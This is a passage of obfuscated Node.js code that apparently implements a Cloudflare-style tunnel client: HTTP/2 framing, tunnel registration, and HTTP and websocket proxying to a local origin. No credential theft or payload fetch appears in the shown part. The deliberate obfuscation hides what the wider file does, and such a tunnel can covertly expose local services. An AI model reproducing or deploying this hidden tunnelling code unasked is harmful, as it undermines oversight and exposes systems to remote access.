    return a[dA(0x499)](([b, c]) => Buffer[dA(0x4ed)](b, 'utf8')['toString'](dA(0x2dd))[dA(0x773)](/=+$/, '') + ':' + Buffer[dA(0x4ed)](c, dA(0x610))['toString'](dA(0x2dd))[dA(0x773)](/=+$/, ''))[dA(0x265)](';');
}
class a0aw {
    constructor(a) {
        const dB = a0aY, b = {
                'XTAEz': 'close',
                'OhEXZ': dB(0x993),
                'tZHJl': 'data',
                'MqVvu': dB(0x53f)
            }, c = dB(0x309)[dB(0x946)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[dB(0x44b)] = a;
                continue;
            case '1':
                this['errored'] = null;
                continue;
            case '2':
                a['on'](b[dB(0x519)], () => {
                    const dC = dB;
                    this[dC(0x3a8)] = !![], this[dC(0x943)]();
                });
                continue;
            case '3':
                a['on'](b[dB(0x7a7)], f => {
                    const dD = dB;
                    this[dD(0x358)] = f, this['_drain']();
                });
                continue;
            case '4':
                a['on'](b[dB(0x859)], f => {
                    const dE = dB;
                    this[dE(0x539)] = this[dE(0x539)]['length'] ? Buffer[dE(0x8ed)]([
                        this[dE(0x539)],
                        f
                    ]) : f, this[dE(0x943)]();
                });
                continue;
            case '5':
                a['on'](b[dB(0x8e4)], () => {
                    const dF = dB;
                    this['closed'] = !![], this[dF(0x943)]();
                });
                continue;
            case '6':
                this[dB(0x3a8)] = ![];
                continue;
            case '7':
                this[dB(0x63f)] = [];
                continue;
            case '8':
                this[dB(0x539)] = Buffer['alloc'](0x0);
                continue;
            }
            break;
        }
    }
    [a0aY(0x943)]() {
        const dG = a0aY, a = {
                'MZtbW': function (b, c) {
                    return b >= c;
                },
                'EOBvA': function (b, c) {
                    return b !== c;
                },
                'tTdgG': dG(0x31e)
            };
        while (this[dG(0x63f)][dG(0x7f5)] > 0x0) {
            const b = this[dG(0x63f)][0x0];
            if (a[dG(0x757)](this[dG(0x539)]['length'], b[dG(0x60d)])) {
                this['waiters'][dG(0x5ab)]();
                const c = this[dG(0x539)][dG(0x23d)](0x0, b[dG(0x60d)]);
                this['buffer'] = this[dG(0x539)][dG(0x23d)](b[dG(0x60d)]), b['resolve'](c);
            } else {
                if (a['EOBvA'](this[dG(0x358)], null))
                    this[dG(0x63f)][dG(0x5ab)](), b['reject'](this[dG(0x358)]);
                else {
                    if (this[dG(0x3a8)])
                        this[dG(0x63f)][dG(0x5ab)](), b[dG(0x415)](new Error(a['tTdgG']));
                    else
                        break;
                }
            }
        }
    }
    [a0aY(0x3e5)](a) {
        const dH = a0aY, b = {
                'GIgVB': function (c, d) {
                    return c >= d;
                }
            };
        if (this[dH(0x358)] !== null)
            return Promise[dH(0x415)](this[dH(0x358)]);
        if (b[dH(0x237)](this['buffer'][dH(0x7f5)], a)) {
            const c = this[dH(0x539)][dH(0x23d)](0x0, a);
            return this['buffer'] = this['buffer']['subarray'](a), Promise['resolve'](c);
        }
        if (this[dH(0x3a8)])
            return Promise[dH(0x415)](new Error(dH(0x31e)));
        return new Promise((d, f) => {
            const dI = dH;
            this[dI(0x63f)][dI(0x39c)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[dI(0x943)]();
        });
    }
}
class a0ax {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const dJ = a0aY, l = { 'qDKJx': dJ(0x73a) }, m = l['qDKJx'][dJ(0x946)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[dJ(0x258)] = new Map();
                continue;
            case '1':
                this[dJ(0x486)] = c;
                continue;
            case '2':
                this['registered'] = ![];
                continue;
            case '3':
                this[dJ(0x64f)] = g;
                continue;
            case '4':
                this['stopped'] = ![];
                continue;
            case '5':
                this[dJ(0x660)] = new Map();
                continue;
            case '6':
                this['tunnelUrl'] = i;
                continue;
            case '7':
                this[dJ(0x2c6)] = new a0af();
                continue;
            case '8':
                this[dJ(0x25b)] = h;
                continue;
            case '9':
                this[dJ(0x7cd)] = new a0aw(a);
                continue;
            case '10':
                this[dJ(0x843)] = 0xffff;
                continue;
            case '11':
                this['control'] = null;
                continue;
            case '12':
                this[dJ(0x927)] = d;
                continue;
            case '13':
                this[dJ(0x957)] = a0a6;
                continue;
            case '14':
                this[dJ(0x33f)] = [];
                continue;
            case '15':
                this[dJ(0x49a)] = j;
                continue;
            case '16':
                this['tunnelId'] = f;
                continue;
            case '17':
                this[dJ(0x692)] = ![];
                continue;
            case '18':
                this[dJ(0x4c0)] = k || { 'printed': ![] };
                continue;
            case '19':
                this['origin'] = b;
                continue;
            case '20':
                this['sock'] = a;
                continue;
            }
            break;
        }
    }
    [a0aY(0x8e0)](a, b, c, d = Buffer[a0aY(0x21a)](0x0)) {
        const dK = a0aY, f = {
                'kgAZG': function (h, i) {
                    return h > i;
                },
                'GdNyP': dK(0x5ff),
                'LNWYb': function (h, i) {
                    return h & i;
                }
            };
        if (f[dK(0x7d8)](d[dK(0x7f5)], 0xffffff))
            throw new Error(f[dK(0x4a2)]);
        const g = Buffer[dK(0x21a)](0x9);
        g[dK(0x2b5)](d[dK(0x7f5)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g['writeUInt32BE'](f[dK(0x636)](c, 0x7fffffff), 0x5), this[dK(0x5b7)][dK(0x4ec)](Buffer['concat']([
            g,
            d
        ]));
    }
    [a0aY(0x5a3)](a, b, c = ![]) {
        const dL = a0aY, d = {
                'wuzLy': function (h, i) {
                    return h(i);
                },
                'FfEIV': function (h, i) {
                    return h | i;
                }
            }, f = d['wuzLy'](a0ai, b), g = d[dL(0x655)](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    [a0aY(0x4eb)](a) {
        const dM = a0aY, b = {
                'TDZqb': function (c, d) {
                    return c > d;
                }
            };
        if (b['TDZqb'](this['connectionWindow'], 0x0) && b[dM(0x6f7)](this[dM(0x660)]['get'](a) ?? 0xffff, 0x0))
            return Promise[dM(0x334)]();
        return new Promise(c => {
            this['windowWaiters']['push']({
                'streamId': a,
                'resolve': c
            });
        });
    }
    ['_notifyWindows']() {
        const dN = a0aY, a = {
                'jaqtp': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[dN(0x33f)]) {
            const d = this['streamWindows'][dN(0x47b)](c['streamId']) ?? 0xffff;
            a['jaqtp'](this[dN(0x843)], 0x0) && d > 0x0 ? c['resolve']() : b['push'](c);
        }
        this['windowWaiters'] = b;
    }
    [a0aY(0x8df)]() {
        const dO = a0aY;
        for (const a of this[dO(0x33f)]) {
            a[dO(0x334)]();
        }
        this[dO(0x33f)] = [];
    }
    async [a0aY(0x822)](a, b, c = ![]) {
        const dP = a0aY, d = {
                'lCrjS': function (h, i) {
                    return h - i;
                },
                'gXieb': function (h, i) {
                    return h >= i;
                },
                'WNydb': function (h, i) {
                    return h - i;
                },
                'xgiut': function (h, i) {
                    return h < i;
                }
            }, f = b[dP(0x7f5)];
        let g = 0x0;
        do {
            await this[dP(0x4eb)](a);
            if (this[dP(0x6f6)])
                return;
            const h = this['streamWindows']['get'](a) ?? 0xffff, i = Math['min'](d[dP(0x41d)](f, g), this[dP(0x843)], h, this[dP(0x957)]), j = c && d[dP(0x6ab)](g + i, f) ? 0x1 : 0x0, k = b[dP(0x23d)](g, g + i);
            this['connectionWindow'] -= i, this[dP(0x660)][dP(0x336)](a, d[dP(0x485)](h, i)), this[dP(0x8e0)](0x0, j, a, k), g += i;
        } while (d[dP(0x4b5)](g, f));
    }
    [a0aY(0x32d)](a, b) {
        const dQ = a0aY, c = {
                'efrze': function (d, f) {
                    return d & f;
                }
            };
        if (b > 0x0) {
            const d = Buffer[dQ(0x21a)](0x4);
            d[dQ(0x95e)](c[dQ(0x333)](b, 0x7fffffff), 0x0), this[dQ(0x8e0)](0x8, 0x0, a, d);
        }
    }
    async [a0aY(0x3d6)]() {
        const dR = a0aY, a = {
                'FLFTH': function (i, j) {
                    return i & j;
                }
            }, b = await this['reader']['readExact'](0x9), c = b[dR(0x1f1)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dR(0x3fd)](b[dR(0x5b4)](0x5), 0x7fffffff), h = await this[dR(0x7cd)][dR(0x3e5)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aY(0x8d5)](a, b, c) {
        const dS = a0aY, d = {
                'aSDNJ': function (g, h) {
                    return g - h;
                },
                'zUmqU': function (g, h) {
                    return g & h;
                },
                'ehlmM': function (g, h) {
                    return g !== h;
                },
                'GMeNo': dS(0x714)
            };
        if (a & 0x8) {
            const g = c[0x0];
            c = c[dS(0x23d)](0x1);
            if (g > c[dS(0x7f5)])
                throw new Error(dS(0x3c5));
            c = g ? c[dS(0x23d)](0x0, d['aSDNJ'](c[dS(0x7f5)], g)) : c;
        }
        d[dS(0x2c7)](a, 0x20) && (c = c[dS(0x23d)](0x5));
        const f = [c];
        while (!d['zUmqU'](a, 0x4)) {
            const h = await this[dS(0x3d6)]();
            if (d[dS(0x36d)](h[0x0], 0x9) || d[dS(0x36d)](h[0x2], b))
                throw new Error(d[dS(0x73d)]);
            f[dS(0x39c)](h[0x3]), a = h[0x1];
        }
        return this[dS(0x2c6)][dS(0x8cc)](Buffer[dS(0x8ed)](f));
    }
    [a0aY(0x80f)](a) {
        const dT = a0aY, b = {
                'UnhEm': function (c, d) {
                    return c !== d;
                },
                'VkKeD': dT(0x736),
                'vQmgk': '200'
            };
        if (b['UnhEm'](this['control'], null))
            return;
        this[dT(0x89c)] = new a0az(this, a, this[dT(0x25b)]), this[dT(0x5a3)](a, [[
                b['VkKeD'],
                b[dT(0x65d)]
            ]]), this[dT(0x89c)][dT(0x845)](this[dT(0x486)], this[dT(0x927)], this[dT(0x8f7)], this[dT(0x64f)]);
    }
    [a0aY(0x93d)](a, b) {
        const dU = a0aY, c = {
                'GQqSf': dU(0x610),
                'Ufzko': function (g, h, i) {
                    return g(h, i);
                },
                'knPIg': dU(0x736),
                'ZXVeH': dU(0x673),
                'YBlAj': 'content-type',
                'UFJLi': 'application/json',
                'hvavw': dU(0x3ba)
            };
        let d = 0x0;
        try {
            const g = JSON[dU(0x57a)](b[dU(0x7f5)] ? b[dU(0x248)](c[dU(0x63c)]) : '{}'), h = c[dU(0x545)](parseInt, g['version'], 0xa);
            !Number[dU(0x638)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dU(0x4ed)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[dU(0x5a3)](a, [
            [
                c['knPIg'],
                c[dU(0x820)]
            ],
            [
                c['YBlAj'],
                c[dU(0x88a)]
            ],
            [
                c['hvavw'],
                String(f[dU(0x7f5)])
            ]
        ]), this[dU(0x822)](a, f, !![]);
    }
    [a0aY(0x751)](a, b) {
        const dV = a0aY, c = { 'Abmxn': dV(0x409) }, d = dV(0x824)[dV(0x946)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['proxyRequest'](a, b)[dV(0x7a8)](() => {
                });
                continue;
            case '1':
                if (b[dV(0x34d)])
                    return;
                continue;
            case '2':
                b[dV(0x8cb)] = !![];
                continue;
            case '3':
                if (b[dV(0x8cb)])
                    return;
                continue;
            case '4':
                if (b['upgrade'] === c[dV(0x411)]) {
                    this['updateConfig'](a, Buffer[dV(0x8ed)](b[dV(0x379)]));
                    return;
                }
                continue;
            }
            break;
        }
    }
    async [a0aY(0x1fe)](a, b) {
        const dW = a0aY, c = {
                'txcyu': function (d, f) {
                    return d === f;
                },
                'fwzha': dW(0x57d),
                'BFKXx': dW(0x870),
                'EmfeS': dW(0x47c),
                'XJUdV': function (d, f) {
                    return d === f;
                },
                'ARTRM': 'connection',
                'unDvy': dW(0x35e),
                'nFwjm': function (d, f) {
                    return d === f;
                },
                'xGGub': dW(0x2b1),
                'QVIsz': function (d, f) {
                    return d(f);
                },
                'oYMcK': dW(0x90f),
                'qjuav': function (d, f) {
                    return d(f);
                },
                'GzAlN': ':status',
                'OpRzp': function (d, f) {
                    return d(f);
                },
                'xmqjv': dW(0x8e2),
                'RciPS': 'cf-cloudflared-response-meta',
                'vUqPa': dW(0x34e),
                'PxBKh': function (d, f) {
                    return d + f;
                },
                'OkHoD': function (d, f) {
                    return d + f;
                },
                'IywMp': function (d, f) {
                    return d + f;
                },
                'ngnCv': dW(0x509),
                'pinRc': dW(0x3f6)
            };
        try {
            const d = await a0aC(this[dW(0x1fa)], b[dW(0x75b)], b['path'], b[dW(0x695)], Buffer['concat'](b['body'])), f = [], g = [];
            for (const [k, l] of d[dW(0x695)]) {
                const m = k[dW(0x216)]();
                c[dW(0x2b6)](m, 'content-length') && g[dW(0x39c)]([
                    m,
                    l
                ]);
                const n = m[dW(0x456)](c[dW(0x685)]) || m['startsWith'](c[dW(0x290)]) || m[dW(0x456)](c['EmfeS']) || m[dW(0x456)](':');
                (!n || c[dW(0x63d)](m, c['ARTRM']) || c[dW(0x2b6)](m, c[dW(0x6bb)]) || c[dW(0x82d)](m, c[dW(0x402)])) && f[dW(0x39c)]([
                    m,
                    l
                ]);
            }
            if (!f[dW(0x85a)](([o]) => o === dW(0x90f))) {
                const o = c[dW(0x4b6)](a0ar, b[dW(0x7eb)]);
                o && f[dW(0x39c)]([
                    c[dW(0x812)],
                    o
                ]);
            }
            const h = c[dW(0x54d)](a0av, f), i = d[dW(0x62d)] === 0x65 ? 0xc8 : d[dW(0x62d)], j = [
                    [
                        c['GzAlN'],
                        c['OpRzp'](String, i)
                    ],
                    ...g,
                    [
                        c[dW(0x903)],
                        h
                    ],
                    [
                        c[dW(0x6d4)],
                        c[dW(0x792)]
                    ]
                ];
            this[dW(0x5a3)](a, j);
            for await (const p of d[dW(0x379)]) {
                await this['sendData'](a, p, ![]);
            }
            await this[dW(0x822)](a, Buffer[dW(0x21a)](0x0), !![]);
        } catch (q) {
            this['log']['warning'](c['PxBKh'](c[dW(0x675)](c[dW(0x3b7)](c[dW(0x236)], a), c['pinRc']), q));
            try {
                this[dW(0x5a3)](a, [[
                        c[dW(0x453)],
                        '502'
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async ['run']() {
        const dX = a0aY, a = {
                'anINA': dX(0x7aa),
                'aqEdm': function (d, f) {
                    return d + f;
                },
                'ANFXx': function (d, f) {
                    return d === f;
                },
                'lDiip': function (d, f) {
                    return d & f;
                },
                'oYSgb': 'invalid\x20SETTINGS\x20payload',
                'AwMcS': function (d, f) {
                    return d === f;
                },
                'PMxTU': function (d, f) {
                    return d - f;
                },
                'DoIKb': function (d, f) {
                    return d + f;
                },
                'aVNLd': function (d, f) {
                    return d <= f;
                },
                'MsPhQ': function (d, f) {
                    return d === f;
                },
                'wXmQK': function (d, f) {
                    return d & f;
                },
                'QZCWu': function (d, f) {
                    return d === f;
                },
                'Vidaa': function (d, f) {
                    return d + f;
                },
                'hSyPb': function (d, f) {
                    return d === f;
                }
            }, b = await this[dX(0x7cd)][dX(0x3e5)](0x18);
        if (!b[dX(0x5c7)](Buffer[dX(0x4ed)](a[dX(0x327)])))
            throw new Error(dX(0x619));
        const c = Buffer['alloc'](0x6);
        c[dX(0x227)](0x3, 0x0), c['writeUInt32BE'](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
        this[dX(0x49a)] && !this[dX(0x4c0)][dX(0x239)] && (process[dX(0x866)]['write'](a[dX(0x7cf)](this[dX(0x49d)], '\x0a')), this[dX(0x4c0)][dX(0x239)] = !![]);
        try {
            while (!this['stopped']) {
                const [d, f, g, h] = await this[dX(0x3d6)]();
                if (a[dX(0x231)](d, 0x4)) {
                    if (!a[dX(0x8da)](f, 0x1)) {
                        if (h[dX(0x7f5)] % 0x6)
                            throw new Error(a[dX(0x5ae)]);
                        for (let i = 0x0; i < h[dX(0x7f5)]; i += 0x6) {
                            const j = h['readUInt16BE'](i), k = h[dX(0x5b4)](a['aqEdm'](i, 0x2));
                            if (a[dX(0x2cd)](j, 0x4)) {
                                const l = a[dX(0x32c)](k, 0xffff);
                                for (const m of this[dX(0x660)]['keys']()) {
                                    this[dX(0x660)]['set'](m, Math[dX(0x253)](0x0, a[dX(0x29c)](this[dX(0x660)][dX(0x47b)](m), l)));
                                }
                            } else
                                a[dX(0x2cd)](j, 0x5) && k >= 0x4000 && a[dX(0x84f)](k, 0xffffff) && (this['peerMaxFrame'] = k);
                        }
                        this[dX(0x8e0)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[dX(0x720)](d, 0x6)) {
                    !a['lDiip'](f, 0x1) && this[dX(0x8e0)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a['ANFXx'](d, 0x8)) {
                    if (h[dX(0x7f5)] !== 0x4)
                        continue;
                    const n = a[dX(0x535)](h['readUInt32BE'](0x0), 0x7fffffff);
                    a[dX(0x5d9)](g, 0x0) ? this['connectionWindow'] += n : this[dX(0x660)][dX(0x336)](g, a['Vidaa'](this[dX(0x660)][dX(0x47b)](g) ?? 0xffff, n));
                    this[dX(0x7ea)]();
                    continue;
                }
                if (a[dX(0x231)](d, 0x3)) {
                    this[dX(0x258)]['delete'](g);
                    continue;
                }
                if (a[dX(0x470)](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this[dX(0x8d5)](f, g, h);
                    !this[dX(0x660)][dX(0x3cc)](g) && this[dX(0x660)][dX(0x336)](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (a[dX(0x470)](d, 0x0)) {
                    this[dX(0x394)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this[dX(0x8df)]();
            for (const p of this[dX(0x258)][dX(0x603)]()) {
                p[dX(0x34b)] && p['websocketProxy']['stop']();
            }
            try {
                this['sock'][dX(0x7f0)]();
            } catch (q) {
            }
        }
    }
    [a0aY(0x860)](a, b, c) {
        const dY = a0aY, d = {
                'jZAIw': function (i, j) {
                    return i === j;
                },
                'CNiBd': function (i, j) {
                    return i & j;
                },
                'iwEQs': ':method',
                'cFVRZ': dY(0x48f),
                'CQmYE': dY(0x632),
                'DtvdM': function (i, j) {
                    return i === j;
                },
                'UDWDq': dY(0x34d),
                'WIlhZ': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dY(0x456)](':') ? f[i] = j : f[i[dY(0x216)]()] = j;
        }
        const g = (f[a0a4] || '')[dY(0x7b0)]()[dY(0x216)]();
        if (d[dY(0x383)](g, a0a5)) {
            this[dY(0x80f)](a);
            d[dY(0x79e)](b, 0x1) && (this[dY(0x89c)][dY(0x8cb)] = !![]);
            return;
        }
        const h = {
            'method': f[d[dY(0x4bd)]] || d['cFVRZ'],
            'path': f[dY(0x209)] || '/',
            'authority': f[d[dY(0x56f)]] || '',
            'headers': c[dY(0x4b3)](([k]) => !k[dY(0x456)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[dY(0x2e9)](g, d[dY(0x66e)]) || d[dY(0x383)]((f[dY(0x596)] || '')[dY(0x216)](), d['UDWDq']),
            'ended': d[dY(0x634)](Boolean, d[dY(0x79e)](b, 0x1)),
            'finished': ![]
        };
        this['streams'][dY(0x336)](a, h);
        if (h['websocket'])
            h['websocketProxy'] = new a0ay(this, a, h, this[dY(0x1fa)], this[dY(0x25b)]), h['websocketProxy'][dY(0x845)]();
        else
            h[dY(0x418)] && this['requestFinished'](a, h);
    }
    [a0aY(0x394)](a, b, c) {
        const dZ = a0aY, d = {
                'lKXeB': function (g, h) {
                    return g !== h;
                },
                'rBoKt': function (g, h) {
                    return g & h;
                },
                'ciCHV': function (g, h) {
                    return g === h;
                },
                'NdkVM': function (g, h) {
                    return g(h);
                }
            };
        this[dZ(0x32d)](0x0, c[dZ(0x7f5)]), this['sendWindowUpdate'](a, c[dZ(0x7f5)]);
        if (d[dZ(0x94b)](this[dZ(0x89c)], null) && this[dZ(0x89c)][dZ(0x443)] === a) {
            this[dZ(0x89c)][dZ(0x4a6)](c);
            d['rBoKt'](b, 0x1) && (this[dZ(0x89c)][dZ(0x8cb)] = !![]);
            return;
        }
        const f = this[dZ(0x258)][dZ(0x47b)](a);
        if (d[dZ(0x5bf)](f, undefined))
            return;
        if (f[dZ(0x34b)] !== undefined) {
            f['websocketProxy'][dZ(0x4a6)](c, d[dZ(0x781)](Boolean, d[dZ(0x292)](b, 0x1)));
            return;
        }
        c[dZ(0x7f5)] && f[dZ(0x379)][dZ(0x39c)](c), d[dZ(0x292)](b, 0x1) && (f[dZ(0x418)] = !![], this[dZ(0x751)](a, f));
    }
}
class a0ay {
    constructor(a, b, c, d, f) {
        const e0 = a0aY, g = { 'uLDFS': '4|0|3|6|8|5|7|1|2' }, h = g[e0(0x87d)][e0(0x946)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[e0(0x443)] = b;
                continue;
            case '1':
                this[e0(0x6f6)] = ![];
                continue;
            case '2':
                this[e0(0x5b7)] = null;
                continue;
            case '3':
                this['request'] = c;
                continue;
            case '4':
                this[e0(0x819)] = a;
                continue;
            case '5':
                this['queue'] = [];
                continue;
            case '6':
                this[e0(0x1fa)] = d;
                continue;
            case '7':
                this['waiters'] = [];
                continue;
            case '8':
                this[e0(0x25b)] = f;
                continue;
            }
            break;
        }
    }
    [a0aY(0x845)]() {
        const e1 = a0aY;
        this['run']()[e1(0x7a8)](() => {
        });
    }
    [a0aY(0x4a6)](a, b = ![]) {
        const e2 = a0aY;
        a[e2(0x7f5)] && this['queue'][e2(0x39c)](a), b && this[e2(0x66c)][e2(0x39c)](null), this[e2(0x890)]();
    }
    [a0aY(0x28a)]() {
        const e3 = a0aY, a = {
                'JncEU': function (b, c) {
                    return b !== c;
                }
            };
        if (this['stopped'])
            return;
        this[e3(0x6f6)] = !![], this[e3(0x890)]();
        if (a[e3(0x7b3)](this['sock'], null))
            try {
                this[e3(0x5b7)]['destroy']();
            } catch (b) {
            }
    }
    [a0aY(0x890)]() {
        const e4 = a0aY;
        for (const a of this[e4(0x63f)]) {
            a();
        }
        this['waiters'] = [];
    }
    async [a0aY(0x935)]() {
        const e5 = a0aY;
        while (!this['stopped']) {
            if (this[e5(0x66c)][e5(0x7f5)])
                return this[e5(0x66c)]['shift']();
            await new Promise(a => this[e5(0x63f)][e5(0x39c)](a));
        }
        return null;
    }
    async [a0aY(0x5c9)]() {
        const e6 = a0aY, a = {
                'ywGxv': function (b, c) {
                    return b(c);
                },
                'pSoYt': function (b, c) {
                    return b === c;
                },
                'jcptI': e6(0x57d),
                'WvykC': 'cf-proxy-',
                'CGOVH': function (b, c) {
                    return b === c;
                },
                'CGxKr': e6(0x35e),
                'epnTX': function (b, c) {
                    return b === c;
                },
                'dXBoa': e6(0x2b1),
                'nJaoc': function (b, c) {
                    return b(c);
                },
                'LFeHt': e6(0x736),
                'opZbr': e6(0x8e2),
                'VuKZN': '{\x22src\x22:\x22origin\x22,\x22flow_rate_limited\x22:false}',
                'bQKvR': function (b, c) {
                    return b + c;
                },
                'YooxQ': e6(0x6ff),
                'LLyOn': e6(0x474)
            };
        try {
            this['sock'] = await a[e6(0x689)](a0aA, this[e6(0x1fa)]), this[e6(0x343)]();
            const b = await a[e6(0x689)](a0aD, this[e6(0x5b7)]), c = [], d = [];
            for (const [i, j] of b[e6(0x695)]) {
                const k = i[e6(0x216)]();
                a['pSoYt'](k, e6(0x3ba)) && d['push']([
                    k,
                    j
                ]);
                const l = k[e6(0x456)](a[e6(0x85e)]) || k[e6(0x456)](e6(0x870)) || k[e6(0x456)](a[e6(0x3bf)]) || k[e6(0x456)](':');
                (!l || k === 'connection' || a[e6(0x35c)](k, a[e6(0x5e5)]) || a[e6(0x711)](k, a[e6(0x7cb)])) && c[e6(0x39c)]([
                    k,
                    j
                ]);
            }
            const f = a['nJaoc'](a0av, c), g = a[e6(0x35c)](b[e6(0x62d)], 0x65) ? 0xc8 : b[e6(0x62d)], h = [
                    [
                        a[e6(0x291)],
                        a['nJaoc'](String, g)
                    ],
                    ...d,
                    [
                        a[e6(0x907)],
                        f
                    ],
                    [
                        'cf-cloudflared-response-meta',
                        a[e6(0x2ff)]
                    ]
                ];
            this[e6(0x819)][e6(0x5a3)](this[e6(0x443)], h), this[e6(0x2ec)]()[e6(0x7a8)](() => {
            }), await this[e6(0x776)](b[e6(0x6e0)]);
        } catch (m) {
            this[e6(0x25b)]['warning'](a[e6(0x7fd)](a[e6(0x7fd)](a['bQKvR'](a[e6(0x522)], this['streamId']), a[e6(0x569)]), m));
            try {
                this[e6(0x819)]['sendHeaders'](this[e6(0x443)], [[
                        a[e6(0x291)],
                        e6(0x3fb)
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async ['pumpOrigin'](a) {
        const e7 = a0aY;
        a[e7(0x7f5)] && await this[e7(0x819)][e7(0x822)](this[e7(0x443)], a, ![]);
        for await (const b of this[e7(0x5b7)]) {
            if (this[e7(0x6f6)])
                break;
            await this['connection']['sendData'](this['streamId'], b, ![]);
        }
        !this[e7(0x6f6)] && await this[e7(0x819)][e7(0x822)](this[e7(0x443)], Buffer[e7(0x21a)](0x0), !![]);
    }
    async [a0aY(0x2ec)]() {
        const e8 = a0aY;
        while (!this[e8(0x6f6)]) {
            const a = await this[e8(0x935)]();
            if (a === null)
                return;
            try {
                this[e8(0x5b7)]['write'](a);
            } catch (b) {
                this[e8(0x6f6)] = !![];
                return;
            }
        }
    }
    [a0aY(0x343)]() {
        const e9 = a0aY, a = {
                'uqGJM': function (i, j) {
                    return i + j;
                },
                'rjFpI': function (i, j) {
                    return i + j;
                },
                'AQyQa': e9(0x86f),
                'igIhg': 'host',
                'vbQgF': e9(0x819),
                'vMIzv': function (i, j) {
                    return i === j;
                },
                'IEwhf': e9(0x3ba),
                'ZdGbV': function (i, j) {
                    return i === j;
                },
                'GbTtn': e9(0x653),
                'ikjGj': e9(0x4ae),
                'aWCYN': e9(0x1fa),
                'WbLqJ': function (i, j) {
                    return i + j;
                },
                'jinrK': e9(0x78f),
                'JMaJl': e9(0x779),
                'HKENz': function (i, j) {
                    return i + j;
                },
                'xPNyC': e9(0x2dd),
                'gDkJN': e9(0x928),
                'kiOKG': e9(0x89b),
                'NLVRZ': e9(0x746),
                'DriyE': e9(0x2db)
            }, b = new URL(this[e9(0x1fa)]), c = this[e9(0x8b2)][e9(0x7eb)][e9(0x456)]('/') ? this[e9(0x8b2)][e9(0x7eb)] : '/' + this[e9(0x8b2)]['path'], d = [a[e9(0x68a)](a[e9(0x404)](e9(0x406), c), a[e9(0x986)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][e9(0x695)]) {
            const k = i['toLowerCase']();
            if (k === a[e9(0x5b0)] || k === a[e9(0x846)] || a[e9(0x2d7)](k, e9(0x35e)) || a['vMIzv'](k, a[e9(0x801)]) || a[e9(0x66f)](k, a[e9(0x20b)]))
                continue;
            if (a[e9(0x2d7)](k, e9(0x8cf)))
                f = !![];
            else {
                if (k === a[e9(0x371)])
                    g = !![];
                else
                    a[e9(0x2d7)](k, a[e9(0x6c9)]) && (h = !![]);
            }
            d[e9(0x39c)](a[e9(0x50f)](i + ':\x20', j));
        }
        d[e9(0x39c)](a[e9(0x404)](a[e9(0x763)], b[e9(0x324)])), !h && this[e9(0x8b2)][e9(0x35f)] && d[e9(0x39c)](a[e9(0x372)] + this['request']['authority']), !f && d['push'](a[e9(0x937)]('Sec-WebSocket-Key:\x20', a0k[e9(0x489)](0x10)[e9(0x248)](a[e9(0x3da)]))), !g && d[e9(0x39c)](a[e9(0x4f2)]), d['push'](a[e9(0x44c)]), d[e9(0x39c)](a[e9(0x311)]), this[e9(0x5b7)][e9(0x4ec)](Buffer[e9(0x4ed)](a[e9(0x937)](d[e9(0x265)]('\x0d\x0a'), e9(0x8a7)), a[e9(0x20d)]));
    }
}
class a0az {
    constructor(a, b, c) {
        const ea = a0aY;
        this['connection'] = a, this[ea(0x443)] = b, this[ea(0x25b)] = c, this[ea(0x539)] = Buffer[ea(0x21a)](0x0), this[ea(0x8cb)] = ![];
    }
    ['start'](a, b, c, d) {
        const eb = a0aY, f = {
                'jtfJj': function (g, h) {
                    return g(h);
                },
                'LWIHM': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[eb(0x819)][eb(0x822)](this['streamId'], f[eb(0x449)](a0ak, 0x0), ![]), this['connection']['sendData'](this[eb(0x443)], f[eb(0x375)](a0al, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aY(0x4a6)](a) {
        const ec = a0aY, b = {
                'jmMpW': function (f, g) {
                    return f(g);
                },
                'DtMvF': function (f, g) {
                    return f(g);
                },
                'YriNL': function (f, g) {
                    return f + g;
                },
                'jBzHx': ec(0x210),
                'rjXaq': 'tunnel\x20registration\x20failed:\x20',
                'vuURF': ec(0x6d1),
                'CsfCG': ec(0x433)
            };
        this[ec(0x539)] = this['buffer'][ec(0x7f5)] ? Buffer[ec(0x8ed)]([
            this['buffer'],
            a
        ]) : a;
        let c, d;
        [c, d] = b[ec(0x423)](a0am, this[ec(0x539)]), this[ec(0x539)] = d;
        for (const f of c) {
            try {
                const g = b[ec(0x6e5)](a0ap, f);
                g['ok'] ? (this[ec(0x25b)][ec(0x8e1)](b[ec(0x219)](ec(0x81f), g['location'] || b[ec(0x6f8)])), this['connection'][ec(0x606)] = !![]) : (this[ec(0x25b)][ec(0x5c4)](b['YriNL'](b[ec(0x3d9)], g[ec(0x993)] || b['vuURF'])), this[ec(0x819)][ec(0x692)] = !![], this[ec(0x819)][ec(0x6f6)] = !![]);
            } catch (h) {
                this['log'][ec(0x761)](b[ec(0x219)](b[ec(0x7d2)], h));
            }
        }
    }
}
function a0aA(a) {
    const ed = a0aY, b = {
            'PUveB': function (c, d, f) {
